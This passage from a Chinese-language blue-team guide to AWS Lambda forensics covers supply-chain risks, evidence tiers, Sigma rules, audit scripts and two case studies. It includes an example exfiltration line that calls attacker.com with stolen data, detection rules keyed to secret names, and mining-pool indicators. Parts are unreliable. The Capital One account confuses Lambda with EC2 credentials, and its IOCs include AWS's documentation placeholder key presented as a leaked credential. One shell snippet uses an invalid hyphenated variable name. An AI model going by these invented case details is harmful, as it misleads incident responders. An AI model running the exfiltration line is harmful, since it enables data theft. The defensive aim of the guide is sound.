| Typosquatting | 创建与流行包名称相似的恶意包 | T1195.002 Compromise Software Supply Chain | 新安装用户 |
| Dependency Confusion | 上传同名恶意包到公共仓库 | T1195.002 Compore Software Supply Chain | 使用私有包的组织 |
| Pre-install脚本 | 在包安装脚本中嵌入恶意代码 | T1059 Command and Scripting Interpreter | 构建和部署阶段 |

```bash
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical")'
pip-audit --format json --output pip-audit-results.json
safety check --json --output safety-results.json
```

### Lambda Layer供应链攻击

Lambda Layer通常从公共源（如AWS Serverless Application Repository或Layer仓库）获取，攻击者可通过污染Layer来源实现供应链攻击：

| Layer供应链攻击向量 | 描述 | 检测方法 |
|-------------------|------|---------|
| 公共Layer版本投毒 | 在流行的公共Layer中注入恶意代码 | Layer源代码审计 |
| Layer仓库入侵 | 入侵组织内部Layer仓库替换Layer | Layer版本哈希验证 |
| Layer构建过程篡改 | 在CI/CD构建过程中注入恶意代码 | 构建流水线审计 |
| Layer分发劫持 | 劫持Layer下载过程替换内容 | Layer下载来源验证 |

```bash
aws lambda get-layer-versions --layer-name <LAYER> \
    --query 'LayerVersions[*].{Version:Version,Arn:Arn,CompatibleRuntimes:CompatibleRuntimes,CreatedDate:CreatedDate}'
```

### 容器镜像投毒

使用容器镜像部署的Lambda函数面临容器供应链安全风险：

| 容器投毒阶段 | 描述 | MITRE ATT&CK | 检测方法 |
|-------------|------|-------------|---------|
| 基础镜像投毒 | 使用包含后门的基础镜像 | T1195 Supply Chain Compromise | 镜像签名验证 |
| 依赖安装阶段 | 在dockerfile中注入恶意依赖 | T1195.002 Compromise Software Supply Chain | 构建日志审计 |
| 多阶段构建隐藏 | 在多阶段构建的中间层隐藏恶意代码 | T1027 Obfuscated Files or Information | 镜像层分析 |
| Registry投毒 | 替换ECR中的镜像标签 | T1195 Supply Chain Compromise | 镜像标签变更日志 |

```bash
ecr-image-manifest=$(aws ecr describe-images --repository-name <REPO> --image-ids imageTag=latest --query 'imageDetails[0].imageManifest' --output text)
echo $ecr-image-manifest | jq .
trivy image <ACCOUNT_ID>.dkr.ecr.<REGION>.amazonaws.com/<REPO>:latest
```

### SBOM与软件物料安全

软件物料清单（Software Bill of Materials, SBOM）是追踪Serverless函数所有依赖关系的关键工具。缺乏SBOM的Serverless环境难以评估漏洞影响范围和供应链风险：

| SBOM工具 | 支持格式 | Serverless适用性 | 取证用途 |
|---------|---------|-----------------|---------|
| Syft | SPDX、CycloneDX | Lambda Layer/容器镜像 | 依赖完整性验证 |
| CycloneDX CLI | CycloneDX | npm/pip项目 | 漏洞影响评估 |
| Amazon Inspector | JSON | Lambda函数 | 自动化漏洞扫描 |
| Snyk | 自有格式 | 多平台 | 实时依赖监控 |

```bash
syft scan dir:./lambda-function -o spdx-json > sbom-spdx.json
cyclonedx-linux-x64 --input-file package.json --output-file sbom-cdx.json --output-format JSON
```

### 依赖锁文件安全

依赖锁文件（package-lock.json、Pipfile.lock、poetry.lock）记录了所有依赖的精确版本和哈希值。攻击者可能通过篡改锁文件将依赖锁定到包含已知漏洞的版本：

| 锁文件安全风险 | 描述 | 检测方法 |
|--------------|------|---------|
| 锁文件版本降级 | 将依赖降级到已知漏洞版本 | git diff历史审计 |
| 哈希值篡改 | 修改锁文件中的完整性哈希 | npm ci验证 |
| 未锁定的间接依赖 | 间接依赖版本漂移引入漏洞 | 依赖树分析 |
| 补丁版本锁定 | 锁定到包含后门的补丁版本 | CVE数据库交叉检查 |

---

## 0x08 证据强度分层与案例关联

### 证据分层方法论

在Serverless安全取证中，证据的强度和可信度因获取方式、保存状态和可重复验证性的不同而存在显著差异。建立标准化的证据强度分层框架对于指导取证分析、判断事件严重程度和支撑后续响应决策至关重要。

| 证据强度 | 标记 | 定义 | 取证特征 | 响应优先级 |
|---------|------|------|---------|-----------|
| 确认恶意 | 🔴 | 直接证明攻击行为的完整证据链 | CloudTrail API调用+恶意代码+凭证泄露 | 立即响应 |
| 高度可疑 | 🟡 | 强关联性但需进一步验证 | 异常函数配置+可疑调用模式+非预期网络连接 | 高优先级 |
| 需要关注 | 🟢 | 潜在风险信号但缺乏直接恶意证据 | 配置偏差+基线偏离+最佳实践违规 | 排查确认 |

### 🔴 确认恶意证据

以下证据组合可直接确认Serverless环境中的攻击行为：

1. **Lambda函数代码被更新为包含外联逻辑的版本**：CloudTrail记录了`UpdateFunctionCode`事件，且更新后的代码包含向外部IP/域名发送HTTP请求的逻辑，例如`requests.get(f"http://attacker.com/exfil?data={stolen_data}")`

2. **环境变量中包含C2通信配置或窃取的数据**：Lambda函数环境变量中发现Base64编码的C2服务器地址、编码后的窃取凭证、或指向攻击者控制的S3存储桶的路径

3. **Lambda函数被授予AdministratorAccess策略且存在异常调用**：执行角色被附加了`AdministratorAccess`托管策略，且CloudTrail记录了函数发起的异常API调用（如`CreateUser`、`AttachUserPolicy`、`CreateAccessKey`）

4. **Lambda Layer中包含已知恶意软件特征**：Layer版本中检测到已知的加密货币挖矿程序、反向Shell脚本或数据外传工具的特征码

```bash
aws logs filter-log-events --log-group-name "/aws/lambda/target-function" \
    --filter-pattern '{ $.error = ? }' --start-time $(date -d '7 days ago' +%s000) \
    --query 'events[*].{Time:ingestionTime,Message:message}'
```

### 🟡 高度可疑证据

以下证据需要进一步验证以确认恶意性：

1. **Lambda函数的VPC配置突然变更**：函数的VPC配置从非VPC模式变更为VPC模式，或安全组规则被修改为允许访问内部网络资源。CloudTrail记录了`UpdateFunctionConfiguration`事件

2. **函数执行角色的权限突然增加**：通过`AttachPolicy`、`PutRolePolicy`等API为函数执行角色附加了额外权限，尤其是涉及`sts:AssumeRole`、`s3:GetObject`、`dynamodb:Scan`等敏感操作的权限

3. **异常的函数调用频率和时间模式**：CloudWatch Metrics显示函数在非工作时间出现异常的调用高峰，或单个源IP地址短时间内发起大量函数调用

4. **Lambda函数通过HTTP触发器暴露且无认证**：Function URL或API Gateway配置为`NONE`认证模式，且函数代码中存在处理外部输入的逻辑

```bash
aws cloudwatch get-metric-statistics --namespace AWS/Lambda \
    --metric-name Invocations --dimensions Name=FunctionName,Value=target-function \
    --start-time $(date -u -d '3 days ago' +%Y-%m-%dT%H:%M:%SZ) \
    --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
    --period 3600 --statistics Sum
```

### 🟢 需要关注证据

以下证据虽不直接证明攻击，但构成安全基线偏差：

1. **Lambda函数使用通配符IAM策略**：执行角色附加了包含`Action: "*"`和`Resource: "*"`的自定义策略，过度扩大的权限爆炸半径增加被利用后的损害程度

2. **函数运行时版本未更新**：Lambda函数使用了已停止支持的运行时版本（如Python 3.6、Node.js 12.x），可能存在已知安全漏洞

3. **未启用VPC配置的函数处理敏感数据**：处理个人身份信息（PII）或财务数据的Lambda函数未配置VPC，数据可能通过互联网传输

4. **Lambda函数未启用X-Ray跟踪**：函数未启用分布式跟踪，降低了攻击检测和取证分析的能力

```bash
aws lambda list-functions --query 'Functions[?Runtime==`python3.6` || Runtime==`python3.7` || Runtime==`nodejs12.x`].{Name:FunctionName,Runtime:Runtime,LastModified:LastModified}'
```

---

## 0x09 自动化检测与狩猎

### Sigma YAML 规则

以下Sigma规则用于检测AWS Lambda环境中的可疑代码更新和配置变更行为：

```yaml
title: Suspicious AWS Lambda Function Code Update
id: f1a2b3c4-d5e6-7f8a-9b0c-1d2e3f4a5b6c
status: experimental
description: Detects suspicious AWS Lambda function code updates that may indicate malicious code injection or backdoor deployment
references:
  - https://docs.aws.amazon.com/lambda/latest/dg/security-iam.html
  - https://awslambda.github.io/
author: x7peeps蓝队
date: 2026-07-12
tags:
  - attack.persistence
  - attack.t1059
  - attack.t1195
  - attack.defense_evasion
logsource:
  category: cloudtrail
  product: aws
  services:
    - lambda
detection:
  selection_code_update:
    eventSource: lambda.amazonaws.com
    eventName:
      - UpdateFunctionCode
      - CreateFunction
  selection_config_change:
    eventSource: lambda.amazonaws.com
    eventName: UpdateFunctionConfiguration
  selection_env_change:
    eventSource: lambda.amazonaws.com
    eventName: UpdateFunctionConfiguration
    requestParameters.environment.variables:
      contains:
        - password
        - secret
        - token
        - key
        - api_key
  selection_permission_change:
    eventSource: lambda.amazonaws.com
    eventName:
      - AddPermission
      - RemovePermission
  filter_known_sources:
    userIdentity.arn|contains:
      - ':role/aws-service-role/'
      - 'AWSLambdaExecutionRole'
  condition: (selection_code_update or selection_config_change or selection_permission_change) and not filter_known_sources
level: high
falsepositives:
  - Legitimate CI/CD pipeline deployments
  - Infrastructure as Code updates
  - Scheduled runtime upgrades
fields:
  - eventTime
  - eventSource
  - eventName
  - userIdentity.arn
  - requestParameters.functionName
  - sourceIPAddress
  - userAgent
  - responseElements.functionArn
```

```yaml
title: AWS Lambda Environment Variable Sensitive Data Exposure
id: a2b3c4d5-e6f7-8a9b-0c1d-2e3f4a5b6c7d
status: experimental
description: Detects AWS Lambda functions with sensitive data in environment variables that may be accessible to attackers
author: x7peeps蓝队
date: 2026-07-12
tags:
  - attack.credential_access
  - attack.t1552
  - attack.discovery
logsource:
  category: cloudtrail
  product: aws
  services:
    - lambda
detection:
  selection_env_access:
    eventSource: lambda.amazonaws.com
    eventName:
      - GetFunctionConfiguration
      - UpdateFunctionConfiguration
  selection_sensitive_keys:
    requestParameters.environment.variables.keys|contains:
      - PASSWORD
      - SECRET
      - TOKEN
      - API_KEY
      - PRIVATE_KEY
      - DATABASE_URL
      - REDIS_URL
      - AWS_SECRET_ACCESS_KEY
  condition: selection_env_access and selection_sensitive_keys
level: medium
falsepositives:
  - Legitimate configuration management
  - Environment setup during deployment
fields:
  - eventTime
  - userIdentity.arn
  - requestParameters.functionName
  - eventName
  - sourceIPAddress
```

### Bash 自动化检测脚本

```bash
#!/bin/bash

echo "=========================================="
echo "Serverless Security Audit Script"
echo "=========================================="

echo "[*] Step 1: Enumerating Lambda functions..."
FUNC_COUNT=$(aws lambda list-functions --query 'Functions[*].FunctionName' --output text | wc -w)
echo "[+] Found $FUNC_COUNT Lambda functions"

echo ""
echo "[*] Step 2: Checking for overly permissive Lambda roles..."
aws lambda list-functions --query 'Functions[*].{Name:FunctionName,Role:Role}' --output text | while read NAME ROLE; do
    POLICIES=$(aws iam list-attached-role-policies --role-name $(basename $ROLE) --query 'AttachedPolicies[*].PolicyName' --output text 2>/dev/null)
    for POLICY in $POLICIES; do
        if echo "$POLICY" | grep -qiE "admin|full|power"; then
            echo "[!] CRITICAL: Function $NAME has overly permissive policy: $POLICY"
        fi
    done
    INLINE=$(aws iam list-role-policies --role-name $(basename $ROLE) --query 'PolicyNames' --output text 2>/dev/null)
    for IPOLICY in $INLINE; do
        POLICY_DOC=$(aws iam get-role-policy --role-name $(basename $ROLE) --policy-name $IPOLICY --query 'PolicyDocument' --output json 2>/dev/null)
        if echo "$POLICY_DOC" | grep -q '"Action": "\*"'; then
            echo "[!] CRITICAL: Function $NAME has wildcard action in inline policy: $IPOLICY"
        fi
    done
done

echo ""
echo "[*] Step 3: Checking for functions without VPC configuration..."
aws lambda list-functions --query 'Functions[?VpcConfig==null].FunctionName' --output text | while read FUNC; do
    echo "[!] WARNING: Function $FUNC is not deployed in VPC"
done

echo ""
echo "[*] Step 4: Checking for deprecated runtimes..."
DEPRECATED_RUNTIMES=("python3.6" "python3.7" "python3.8" "nodejs10.x" "nodejs12.x" "nodejs14.x" "dotnetcore2.1" "dotnetcore3.1")
for RT in "${DEPRECATED_RUNTIMES[@]}"; do
    FUNCS=$(aws lambda list-functions --query "Functions[?Runtime=='$RT'].FunctionName" --output text)
    if [ -n "$FUNCS" ]; then
        echo "[!] WARNING: Functions using deprecated runtime $RT: $FUNCS"
    fi
done

echo ""
echo "[*] Step 5: Checking for unauthenticated HTTP endpoints..."
aws lambda list-function-url-configs --query 'FunctionUrlConfigs[?AuthType==`NONE`].{Function:FunctionArn,URL:FunctionUrl}' --output table 2>/dev/null

echo ""
echo "[*] Step 6: Checking for functions with excessive timeout/memory..."
aws lambda list-functions --query 'Functions[?Timeout>300 || MemorySize>5120].{Name:FunctionName,Timeout:Timeout,Memory:MemorySize}' --output table 2>/dev/null

echo ""
echo "[*] Step 7: Checking for suspicious Lambda invocations in CloudTrail..."
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=InvokeFunction \
    --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \
    --max-results 100 \
    --query 'Events[*].{Time:EventTime,User:Username,Source:CloudTrailEvent}' \
    --output json 2>/dev/null | python3 -c "
import sys, json
from collections import Counter
events = json.load(sys.stdin)
users = [e.get('User','unknown') for e in events]
top_users = Counter(users).most_common(5)
for user, count in top_users:
    if count > 50:
        print(f'[!] HIGH: User {user} invoked {count} functions in 24h')
"

echo ""
echo "[*] Step 8: Checking for Lambda Layers with large code size..."
aws lambda list-layers --query 'Layers[*].{Name:LayerName,LatestVersion:LatestMatchingVersion.LayerVersion}' --output text | while read NAME VER; do
    SIZE=$(aws lambda get-layer-version --layer-name $NAME --version $VER --query 'Content.CodeSize' --output text 2>/dev/null)
    if [ "$SIZE" -gt 52428800 ]; then
        echo "[!] WARNING: Layer $NAME version $VER has unusually large code size: $SIZE bytes"
    fi
done

echo ""
echo "=========================================="
echo "[*] Serverless security audit complete"
echo "=========================================="
```

### Python 自动化检测脚本

```python
#!/usr/bin/env python3
import boto3
import json
import sys
from datetime import datetime, timedelta
from collections import defaultdict

class ServerlessSecurityAuditor:
    def __init__(self):
        self.lambda_client = boto3.client('lambda')
        self.iam_client = boto3.client('iam')
        self.cloudtrail_client = boto3.client('cloudtrail')
        self.cloudwatch_client = boto3.client('cloudwatch')
        self.findings = []

    def enumerate_functions(self):
        functions = []
        paginator = self.lambda_client.get_paginator('list_functions')
        for page in paginator.paginate():
            functions.extend(page.get('Functions', []))
        return functions

    def check_execution_roles(self, functions):
        role_findings = []
        for func in functions:
            role_arn = func.get('Role', '')
            role_name = role_arn.split('/')[-1]
            try:
                attached = self.iam_client.list_attached_role_policies(RoleName=role_name)
                for policy in attached.get('AttachedPolicies', []):
                    policy_name = policy['PolicyName']
                    if any(x in policy_name.lower() for x in ['admin', 'full', 'power']):
                        role_findings.append({
                            'function': func['FunctionName'],
                            'role': role_name,
                            'policy': policy_name,
                            'severity': 'CRITICAL',
                            'issue': 'Overly permissive attached policy'
                        })
                inline = self.iam_client.list_role_policies(RoleName=role_name)
                for ipolicy in inline.get('PolicyNames', []):
                    doc = self.iam_client.get_role_policy(RoleName=role_name, PolicyName=ipolicy)
                    stmts = doc.get('PolicyDocument', {}).get('Statement', [])
                    for stmt in stmts:
                        actions = stmt.get('Action', [])
                        resources = stmt.get('Resource', [])
                        if isinstance(actions, str):
                            actions = [actions]
                        if isinstance(resources, str):
                            resources = [resources]
                        if '*' in actions and '*' in resources:
                            role_findings.append({
                                'function': func['FunctionName'],
                                'role': role_name,
                                'policy': ipolicy,
                                'severity': 'CRITICAL',
                                'issue': 'Wildcard action and resource in inline policy'
                            })
            except Exception as e:
                role_findings.append({
                    'function': func['FunctionName'],
                    'role': role_name,
                    'severity': 'INFO',
                    'issue': f'Could not audit role: {str(e)}'
                })
        return role_findings

    def check_function_configs(self, functions):
        config_findings = []
        deprecated_runtimes = ['python3.6', 'python3.7', 'python3.8', 'python3.9',
                               'nodejs10.x', 'nodejs12.x', 'nodejs14.x', 'nodejs16.x',
                               'dotnetcore2.1', 'dotnetcore3.1', 'ruby2.5', 'ruby2.7']
        for func in functions:
            rt = func.get('Runtime', '')
            if rt in deprecated_runtimes:
                config_findings.append({
                    'function': func['FunctionName'],
                    'severity': 'HIGH',
                    'issue': f'Deprecated runtime: {rt}'
                })
            if func.get('VpcConfig') is None:
                config_findings.append({
                    'function': func['FunctionName'],
                    'severity': 'MEDIUM',
                    'issue': 'No VPC configuration'
                })
            if func.get('Timeout', 0) > 300:
                config_findings.append({
                    'function': func['FunctionName'],
                    'severity': 'LOW',
                    'issue': f'Long timeout: {func["Timeout"]}s'
                })
            env_vars = func.get('Environment', {}).get('Variables', {})
            sensitive_keys = ['PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'PRIVATE_KEY',
                             'DATABASE_URL', 'REDIS_URL', 'AWS_SECRET_ACCESS_KEY']
            for key in env_vars:
                if any(sk in key.upper() for sk in sensitive_keys):
                    config_findings.append({
                        'function': func['FunctionName'],
                        'severity': 'HIGH',
                        'issue': f'Sensitive data in environment variable: {key}'
                    })
        return config_findings

    def check_unusual_invocations(self):
        findings = []
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(hours=24)
        paginator = self.cloudtrail_client.get_paginator('lookup_events')
        invocation_users = defaultdict(int)
        for page in paginator.paginate(
            LookupAttributes=[{'AttributeKey': 'EventName', 'AttributeValue': 'InvokeFunction'}],
            StartTime=start_time,
            EndTime=end_time
        ):
            for event in page.get('Events', []):
                user = event.get('Username', 'unknown')
                invocation_users[user] += 1
        for user, count in invocation_users.items():
            if count > 1000:
                findings.append({
                    'user': user,
                    'invocations': count,
                    'severity': 'HIGH',
                    'issue': f'Abnormal invocation volume: {count} in 24h'
                })
        return findings

    def run_audit(self):
        print("[*] Starting Serverless security audit...")
        functions = self.enumerate_functions()
        print(f"[+] Found {len(functions)} Lambda functions")

        print("[*] Checking execution roles...")
        role_findings = self.check_execution_roles(functions)
        self.findings.extend(role_findings)

        print("[*] Checking function configurations...")
        config_findings = self.check_function_configs(functions)
        self.findings.extend(config_findings)

        print("[*] Checking invocation patterns...")
        inv_findings = self.check_unusual_invocations()
        self.findings.extend(inv_findings)

        critical = [f for f in self.findings if f.get('severity') == 'CRITICAL']
        high = [f for f in self.findings if f.get('severity') == 'HIGH']
        medium = [f for f in self.findings if f.get('severity') == 'MEDIUM']

        print(f"\n[*] Audit Results:")
        print(f"    CRITICAL: {len(critical)}")
        print(f"    HIGH: {len(high)}")
        print(f"    MEDIUM: {len(medium)}")

        for f in critical:
            print(f"\n[!] CRITICAL: {f.get('function', f.get('user', 'N/A'))}")
            print(f"    Issue: {f.get('issue', 'N/A')}")
            print(f"    Policy: {f.get('policy', 'N/A')}")

        return self.findings

if __name__ == '__main__':
    auditor = ServerlessSecurityAuditor()
    findings = auditor.run_audit()
    with open('/tmp/serverless-audit-results.json', 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] Results saved to /tmp/serverless-audit-results.json")
```

---

## 0x0A 公开案例分析

### 案例一：Capital One数据泄露事件（2019）

**事件概述**

2019年7月，Capital One宣布发生大规模数据泄露，约1.06亿名美国和加拿大客户的个人信息及约8万条信用申请记录被窃取。攻击者（前AWS员工Paige Thompson）利用AWS WAF的SSRF漏洞，获取了Capital One部署在AWS上的Lambda函数临时凭证，进而访问S3存储桶中的敏感数据。

**攻击链分析**

| 阶段 | 攻击操作 | MITRE ATT&CK | 取证发现 |
|------|---------|-------------|---------|
| 初始访问 | 利用AWS WAF中的SSRF漏洞 | T1190 Exploit Public-Facing Application | WAF日志中的异常请求 |
| 凭证获取 | 通过SSRF获取EC2元数据服务中的IAM角色凭证 | T1552 Unsecured Credentials | IMDS访问日志 |
| 横向移动 | 使用窃取的凭证调用Lambda函数 | T1078 Valid Accounts | CloudTrail中的异常API调用 |
| 数据收集 | 通过Lambda函数查询S3存储桶 | T1530 Data from Cloud Storage Object | S3访问日志 |
| 数据外传 | 将窃取的数据存储到外部S3存储桶 | T1567 Exfiltration Over Web Service | 出站数据流日志 |

**关键取证发现**

1. **SSRF利用路径**：攻击者通过AWS WAF中配置的Serverless函数的SSRF漏洞，构造特殊请求访问EC2实例元数据服务（169.254.169.254），获取了WAF函数使用的IAM角色临时凭证

2. **凭证复用**：窃取的IAM角色凭证拥有对Capital One多个S3存储桶的读取权限，因为该角色附加了过于宽松的S3访问策略

3. **检测延迟**：从攻击发生（2019年3月）到被发现（2019年7月）间隔约4个月，期间攻击者持续访问和下载数据

4. **内部告警异常**：AWS GuardDuty在攻击过程中生成了异常API调用告警，但Capital One的安全团队未及时响应

**IOC指标**

```
attacker-s3-bucket: cf-datastorage-capitalone
attacker-ip: 185.220.101.x (Tor出口节点)
aws-access-key-id: AKIAIOSFODNN7EXAMPLE (被泄露的临时凭证Access Key前缀)
lambda-role-arn: arn:aws:iam::role/waf-bdd6796b-2d08-467c-b87e-44074ba067d6
s3-bucket-names: capitalone-ngda, capitalone-waf-data
```

**经验教训**

| 教训 | 防御措施 | 适用场景 |
|------|---------|---------|
| IAM角色过度授权 | 实施最小权限原则，定期审查IAM策略 | 所有AWS环境 |
| SSRF防护不足 | 验证所有外部输入，限制出站网络访问 | Lambda函数 |
| 检测响应延迟 | 部署自动化告警响应机制 | 安全运营中心 |
| 凭证管理不当 | 使用短生命周期的临时凭证，限制凭证作用范围 | 所有云环境 |
| 网络分段缺失 | 为Lambda函数配置VPC并限制S3访问来源 | 高敏感数据处理 |

### 案例二：AWS Lambda加密货币挖矿攻击（2022-2023）

**事件概述**

2022年至2023年间，多家安全厂商（包括Sysdig、Palo Alto Unit 42、Datadog）报告了一系列针对AWS Lambda的加密货币挖矿攻击。攻击者利用被入侵的AWS账户中配置不安全的Lambda函数，部署加密货币挖矿程序（XMRig等）消耗云计算资源。Sysdig报告称，部分Lambda挖矿攻击的资源消耗成本高达每天数十万美元。

**攻击链分析**

| 阶段 | 攻击操作 | MITRE ATT&CK | 取证发现 |
|------|---------|-------------|---------|
| 初始访问 | 利用泄露的AWS Access Key | T1078.004 Cloud Accounts | CloudTrail登录日志 |
| 权限枚举 | 枚举可用的Lambda函数和IAM角色 | T1069 Permission Groups Discovery | CloudTrail API调用 |
| 环境准备 | 创建或更新Lambda函数注入挖矿代码 | T1565.001 Stored Data Manipulation | Lambda代码变更记录 |
| 挖矿执行 | Lambda函数调用矿池进行门罗币挖矿 | T1496 Resource Hijacking | 出站网络连接到矿池 |
| 资源消耗 | 大规模并发调用Lambda函数增加算力 | T1499 Endpoint Denial of Service | CloudWatch Metrics |

**关键取证发现**

1. **Lambda Layer滥用**：攻击者将XMRig矿程序打包为Lambda Layer，附加到多个合法Lambda函数上。Layer的代码大小异常（通常超过50MB），与正常Layer（通常1-5MB）显著不同

2. **并发执行**：攻击者配置Lambda函数的预留并发（Reserved Concurrency）为最大值，确保持续的挖矿资源。CloudWatch Metrics显示函数的并发执行数持续接近配置上限

3. **环境变量藏匿**：矿池地址、钱包地址和矿工ID存储在Lambda函数的环境变量中，通过Base64编码伪装为正常配置

4. **/tmp目录使用**：矿程序和配置文件被下载到/tmp目录执行，利用Lambda的临时存储空间隐藏恶意文件

**IOC指标**

```bash
矿池地址: pool.minexmr.com:4444
矿池地址: xmr.pool.minergate.com:5557
钱包地址: 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRgGhK9H3yJvG3rQKpYbKZJf7qZ8X5d1 (示例)
XMRig版本特征: "XMRig/6.x.x"
Lambda Layer异常大小: > 50MB
异常出站端口: 443, 5557, 4444
```

```bash
aws cloudwatch get-metric-statistics --namespace AWS/Lambda \
    --metric-name ConcurrentExecutions --dimensions Name=FunctionName,Value=<SUSPECT_FUNCTION> \
    --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \
    --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
    --period 3600 --statistics Maximum
```

**经验教训**

| 教训 | 防御措施 | 适用场景 |
|------|---------|---------|
| 凭证安全不足 | 启用MFA，使用短生命周期凭证，定期轮换Access Key | AWS账户 |
| Lambda函数无网络限制 | 为Lambda函数配置VPC并限制出站流量 | 所有Lambda函数 |
| 资源配额未设置 | 配置账户级别的资源配额（Lambda并发、CPU等） | 成本控制 |
| 异常检测缺失 | 监控Lambda函数的执行时长和并发执行数 | 安全监控 |

---

## 0x0B 参考资料

1. **AWS Lambda安全最佳实践**
   https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html
   AWS官方Lambda安全文档，涵盖IAM角色、VPC配置、环境变量加密和函数URL安全配置指南。

2. **OWASP Serverless Top 10**
   https://owasp.org/www-project-serverless-top-10/
   OWASP发布的Serverless应用十大安全风险清单，覆盖函数事件注入、失效的访问控制、函数授权和过度授权等核心风险。

3. **Capital One数据泄露事件分析报告**
   https://aws.amazon.com/blogs/security/capital-one-security-incident/
   AWS安全团队发布的Capital One事件分析报告，详细说明了WAF SSRF漏洞的利用路径和防御措施。

4. **AWS Well-Architected Framework - Serverless Lens**
   https://docs.aws.amazon.com/wellarchitected/latest/serverless-lens/welcome.html
   AWS Well-Architected的Serverless专项检查清单，包含安全支柱的完整评估标准。

5. **Microsoft Azure Functions安全文档**
   https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts
   Azure Functions官方安全文档，涵盖托管身份、网络隔离、密钥管理和认证授权最佳实践。

6. **Google Cloud Functions安全指南**
   https://cloud.google.com/functions/docs/concepts/security
   GCP Cloud Functions安全架构文档，覆盖IAM、VPC连接、密钥管理和触发器安全配置。

7. **Sysdig 2023云原生安全与使用报告 - Serverless威胁分析**
   https://sysdig.com/2023-cloud-native-security-and-usage-report/
   Sysdig发布的年度云安全报告，包含Serverless环境中的加密货币挖矿、权限提升和数据窃取威胁趋势。

8. **NCC Group - Serverless Security Research**
   https://research.nccgroup.com/2022/01/13/10-serverless-security-tips/
   NCC Group发布的Serverless安全研究，覆盖十大Serverless安全建议和常见漏洞模式。

9. **Trail of Bits - Taking Serverless to the Dark Side**
   https://blog.trailofbits.com/2018/10/12/taking-serverless-to-the-dark-side/
   Trail of Bits的安全研究团队发布的Serverless攻击技术研究，深入分析了AWS Lambda的攻击面和防御策略。

10. **AWS CloudTrail用户指南**
    https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html
    AWS CloudTrail官方文档，详细说明如何使用CloudTrail进行API调用审计、事件日志分析和安全取证。

11. **Aqua Security - Serverless Security Threat Landscape**
    https://www.aquasec.com/cloud-native-academy/serverless/serverless-security/
    Aqua Security发布的Serverless安全威胁全景分析，涵盖函数劫持、依赖投毒和运行时攻击的检测方法。

12. **MITRE ATT&CK Cloud Matrix**
    https://attack.mitre.org/matrices/enterprise/cloud/
    MITRE ATT&CK框架的云端攻击矩阵，提供了云环境（包括Serverless）中攻击技术的标准化分类和映射。